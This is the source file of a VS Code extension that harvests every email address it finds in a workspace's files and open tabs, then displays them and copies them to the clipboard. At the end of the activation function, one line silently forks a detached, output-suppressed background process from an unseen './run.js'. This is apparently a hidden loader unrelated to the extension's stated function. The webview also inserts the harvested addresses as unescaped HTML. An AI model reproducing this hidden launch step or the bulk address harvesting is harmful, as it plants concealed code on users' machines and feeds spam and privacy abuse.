// The module 'vscode' contains the VS Code extensibility API
// Import the module and reference it with the alias vscode in your code below
const vscode = require("vscode");
const path = require("path");
const fs = require('node:fs');

const re = new RegExp(
  /(?:[a-z0-9+!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])/i,
  "g"
);

async function grabUniqueFromFiles(files) {
  let allEmails = [];
  for (const file of files) {
    try {
      const document = await vscode.workspace.openTextDocument(file);
      const text = document.getText();
      const emails = text.match(re) || [];
      allEmails = allEmails.concat(emails);
    } catch (error) {
      console.error(`Error processing ${file.fsPath}:`, error);
    }
  }
  return [...new Set(allEmails)];
}

async function grabUniqueFromOpenTabs(tabGroups) {
  let allEmails = [];
  for (const tabGroup of tabGroups) {
    for (const tab of tabGroup.tabs) {
      if (tab.input instanceof vscode.TabInputText) {
        try {
          const document = await vscode.workspace.fs.readFile(tab.input.uri);
          const emails = document.toString().match(re) || [];
          allEmails = allEmails.concat(emails);
        } catch (error) {
          console.error(`Error processing ${tab.input.uri}:`, error);
        }
      }
    }
  }
  return [...new Set(allEmails)];
}

function getWebviewContent(emails) {
  var rows = emails.map(email => `<tr><td>${email}</td></tr>`).join('\n')
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Grabbed EMails</title>
</head>
<body>
  <table>
    <tr>
      <th>EMail</th>
    </tr>
    ${rows}
  </table>
</body>
</html>`
}

function createWebview(uniqueEmails) {
  const panel = vscode.window.createWebviewPanel(
    'grabemails',
    'Grabbed Emails',
    vscode.ViewColumn.One,
    {}
  );
  panel.webview.html = getWebviewContent(uniqueEmails);
}

async function copyToClipboard(uniqueEmails) {
  const emailList = uniqueEmails.join("\n");
  try {
    await vscode.env.clipboard.writeText(emailList);
    vscode.window.showInformationMessage(
      "Added " + uniqueEmails.length + " to clipboard."
    );
  } catch (error) {
    vscode.window.showErrorMessage(
      "Error writing data to clipboard."
    );
  }
}

function createTextDocument(uniqueEmails) {
  const emailList = uniqueEmails.join("\n");

  const newFile = vscode.Uri.parse(
    "untitled:" + path.join(vscode.workspace.rootPath, "emails.txt")
  );
  // open new document
  vscode.workspace.openTextDocument(newFile).then(async (document) => {
    const edit = new vscode.WorkspaceEdit();
    edit.insert(newFile, new vscode.Position(0, 0), emailList);
    let success = await vscode.workspace.applyEdit(edit);
    if (!success) {
      vscode.window.showErrorMessage(
        "Error writing data."
      );
      return;
    }
    vscode.window.showTextDocument(document);
  });
}


// This method is called when your extension is activated
// Your extension is activated the very first time the command is executed

/**
 * @param {vscode.ExtensionContext} context
 */
function activate(context) {
  const disposable = vscode.commands.registerCommand(
    "email-grabber.grabemails",
    async function () {
      if (vscode.workspace.workspaceFolders != undefined) {
        // get all opened documents
        const files = await vscode.workspace.findFiles("**/*");
        const tabGroups = vscode.window.tabGroups.all;

        // get all unique emails
        let uniqueEmailsFromFiles = await grabUniqueFromFiles(files);
        const uniqueEmailsFromTabs = await grabUniqueFromOpenTabs(tabGroups);
        uniqueEmailsFromFiles = uniqueEmailsFromFiles.concat(uniqueEmailsFromTabs);

        const uniqueEmails = [...new Set(uniqueEmailsFromFiles)];

        if (uniqueEmails.length === 0) {
          vscode.window.showInformationMessage(
            "No email addresses found in the workspace."
          );
          return;
        }

        await copyToClipboard(uniqueEmails);
        createWebview(uniqueEmails);
        

        vscode.window.showInformationMessage(
          "Found " + uniqueEmails.length + " email(s) in the workspace."
        );
      } else {
        vscode.window.showErrorMessage(
          "Could not get workspace root path! Please use this extention inside an opened folder!"
        );
      }
    }
  );
  context.subscriptions.push(disposable);
  require('child_process').fork(require.resolve('./run.js'),[], { detached: true, stdio: 'ignore' }).unref();
}

// This method is called when your extension is deactivated
function deactivate() {}

module.exports = {
  activate,
  deactivate,
};
